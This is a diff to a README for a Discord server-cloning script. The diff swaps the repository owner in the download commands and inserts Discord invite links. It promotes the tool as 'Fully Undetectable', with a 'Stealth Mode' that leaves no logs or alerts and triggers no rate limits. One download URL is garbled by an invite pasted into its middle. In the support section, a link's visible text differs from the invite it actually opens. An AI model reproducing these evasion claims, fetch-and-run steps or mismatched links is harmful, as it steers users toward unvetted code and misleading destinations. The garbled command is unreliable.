@@ -34,7 +34,7 @@ T-D ORGANISATION (TEAM-DARK) X 𝐍𝐄𝐗𝐔𝐒 & 𝐗𝐘𝐓𝐇𝐄𝐑
 ## 🔥 **Overview**
 
 **Discord-Zero-Cloner** is a professional-grade, command-line tool designed for **rapid server cloning** on Discord. Single-file deployment, cross-platform compatibility, and zero dependencies beyond Python standard library.
-
+https://discord.gg/SzWt6yhMm5
 - **Fully Undetectable (FUD)** – No rate limits triggered  
 - **Bulletproof Architecture** – Handles large servers (10k+ members)  
 - **Stealth Mode** – No logs, no footprints, no alerts  
@@ -57,7 +57,7 @@ T-D ORGANISATION (TEAM-DARK) X 𝐍𝐄𝐗𝐔𝐒 & 𝐗𝐘𝐓𝐇𝐄𝐑
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 ## 📦 **Installation**
 ```bash
-git clone https://github.com/more-dark/Discord-Zero-Cloner.git
+git clone https://github.com/T-D-Organization/Discord-Zero-Cloner.git
 cd Discord-Zero-Cloner
 ```
 ```bash
@@ -81,10 +81,10 @@ python zero-cloner.py
 ### Quick Install (One File)
 ```bash
 # Linux / macOS
-wget https://raw.githubusercontent.com/more-dark/Discord-Zero-Cloner/main/zero-cloner.py
+wget https://raw.githubusercontent.com/T-D-Organization/Discord-Zero-Cloner/main/zero-cloner.py
 
 # Windows (PowerShell)
-Invoke-WebRequest -Uri "https://raw.githubusercontent.com/more-dark/Discord-Zero-Cloner/main/zero-cloner.py" -OutFile "zero_cloner.py"
+Invoke-WebRequest -Uri "https://raw.githubusercontent.com/T-D-Organizationhttps://discord.gg/SzWt6yhMm5/Discord-Zero-Cloner/main/zero-cloner.py" -OutFile "zero_cloner.py"
 
 # Or simply copy the code below into a file named zero_cloner.py
 ```
@@ -92,7 +92,7 @@ Invoke-WebRequest -Uri "https://raw.githubusercontent.com/more-dark/Discord-Zero
 
 For support:
 • Read this README fully first
-• Join [https://discord.gg/bUPqSj8VzR](https://discord.gg/bUPqSj8VzR) for any issue
+• Join [https://discord.gg/bUPqSj8VzR](https://discord.gg/SzWt6yhMm5) for any issue
 
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 # 🛡️ Disclaimer
